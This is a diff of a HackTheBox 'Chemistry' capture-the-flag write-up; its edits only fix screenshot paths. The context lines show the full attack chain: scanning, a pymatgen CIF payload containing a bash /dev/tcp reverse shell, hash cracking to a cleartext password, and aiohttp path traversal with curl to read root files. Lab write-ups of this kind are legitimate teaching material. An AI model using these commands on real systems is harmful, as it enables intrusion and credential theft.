@@ -46,7 +46,7 @@ Verify if the host is alive using ICMP:
 ping -c 1 10.10.11.38
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The machine responds, confirming it is reachable.
 
@@ -69,7 +69,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.38 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![ping](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/allPorts.png)
+![ping](screenshots/allPorts.png)
 
 Extract the open ports:
 
@@ -77,7 +77,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractPorts](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/extractPorts.png)
+![extractPorts](screenshots/extractPorts.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -95,7 +95,7 @@ nmap -sCV -p22,5000 10.10.11.38 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format
 
-![targeted](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -116,26 +116,26 @@ Browsing to `http://10.10.11.38:5000` reveals a Flask-based application **"Chemi
 curl -i http://10.10.11.38:5000/
 ```
 
-![chemistry_analyzer](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/chemistry_analyzer.png)
+![chemistry_analyzer](screenshots/chemistry_analyzer.png)
 
 Tried common credentials (`admin:admin`, `root:root`, etc.) without success.:
 
-![login_invalid_credentials](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/login_invalid_credentials.png)
+![login_invalid_credentials](screenshots/login_invalid_credentials.png)
 
 Registered a new account:
 
-![register](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/register.png)
+![register](screenshots/register.png)
 
 Once logged in, the dashboard allows uploading `.cif` files â€” suggesting potential **file parsing vulnerabilities**.
 
-![dashboard_upload](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/dashboard_upload.png)
+![dashboard_upload](screenshots/dashboard_upload.png)
 
 ---
 ### 2.2 Upload Functionality
 
 The application accepts only `.cif` files and provides a sample in **here** button:
 
-![cif_example](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/cif_example.png)
+![cif_example](screenshots/cif_example.png)
 
 Researching CIF file parsing, we found a security advisory for `pymatgen` CIF parser:  
 [GHSA-vgv8-5cpj-qj2f](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f) â€” **Arbitrary Code Execution** vulnerability.
@@ -146,7 +146,7 @@ We crafted a malicious `.cif` file containing a reverse shell payload:
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.3/9090 0>&1'
 ```
 
-![rs_cif](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/rs_cif.png)
+![rs_cif](screenshots/rs_cif.png)
 
 Started a listener:
 
@@ -156,9 +156,9 @@ nc -lnvp 9090
 
 Uploaded the malicious file and clicked **view**.
 
-![rs_uploaded](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/rs_uploaded.png)
+![rs_uploaded](screenshots/rs_uploaded.png)
 
-![nc_9090](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/nc_9090.png)
+![nc_9090](screenshots/nc_9090.png)
 
 Reverse shell obtained.
 
@@ -171,19 +171,19 @@ Enumerating the system:
 cat /etc/passwd
 ```
 
-![etc_passwd_app](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/etc_passwd_app.png)
+![etc_passwd_app](screenshots/etc_passwd_app.png)
 
 Only `root` and `rosa` accounts have valid shells.  
 
 Let's navigate between system:
 
-![ls_app](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/ls_app.png)
+![ls_app](screenshots/ls_app.png)
 
 Inside `/instance`, found `database.db` containing password hashes:
 
-![instance](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/instance.png)
+![instance](screenshots/instance.png)
 
-![database](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/database.png)
+![database](screenshots/database.png)
 
 Extracted the hash for `rosa`:
 
@@ -193,7 +193,7 @@ Extracted the hash for `rosa`:
 
 Cracked using CrackStation:
 
-![crackstation](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/crackstation.png)
+![crackstation](screenshots/crackstation.png)
 
 **Password:** `unicorniosrosados`
 
@@ -203,7 +203,7 @@ SSH access as `rosa`:
 ssh rosa@10.10.11.38
 ```
 
-![ssh_rosa](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/ssh_rosa.png)
+![ssh_rosa](screenshots/ssh_rosa.png)
 
 ðŸ **User flag obtained**
 
@@ -214,13 +214,13 @@ ssh rosa@10.10.11.38
 
 Let's see if there are any service active in rosa ssh session:
 
-![ss_lnt](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/ss_lnt.png)
+![ss_lnt](screenshots/ss_lnt.png)
 
 From the SSH session, internal port scanning revealed a service on `127.0.0.1:8080`.  
 
 If we try to access the website will not be loaded:
 
-![127001_9999_no_connection](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/127001_9999_no_connection.png)
+![127001_9999_no_connection](screenshots/127001_9999_no_connection.png)
 
 So we need to forwarded it locally by command
 
@@ -230,7 +230,7 @@ ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
 
 Refresh the website:
 
-![127001_9999](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/127001_9999.png)
+![127001_9999](screenshots/127001_9999.png)
 
 ---
 ### 4.2 Exploiting LFI in aiohttp
@@ -243,11 +243,11 @@ This version of `aiohttp` (3.9.1) is vulnerable to **Path Traversal â†’ Arb
 curl --path-as-is http://127.0.0.1:9999
 ```
 
-![curl_path_as_is](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/curl_path_as_is.png)
+![curl_path_as_is](screenshots/curl_path_as_is.png)
 
 Let's enumerate `/etc/passwd`:
 
-![etc_passwd](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/etc_passwd.png)
+![etc_passwd](screenshots/etc_passwd.png)
 
 We exploited the LFI to read `/root/root.txt`:
 
@@ -255,7 +255,7 @@ We exploited the LFI to read `/root/root.txt`:
 curl --path-as-is http://127.0.0.1:8080/assets/../../../root/root.txt
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/Chemistry/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ðŸ **Root flag obtained**
 
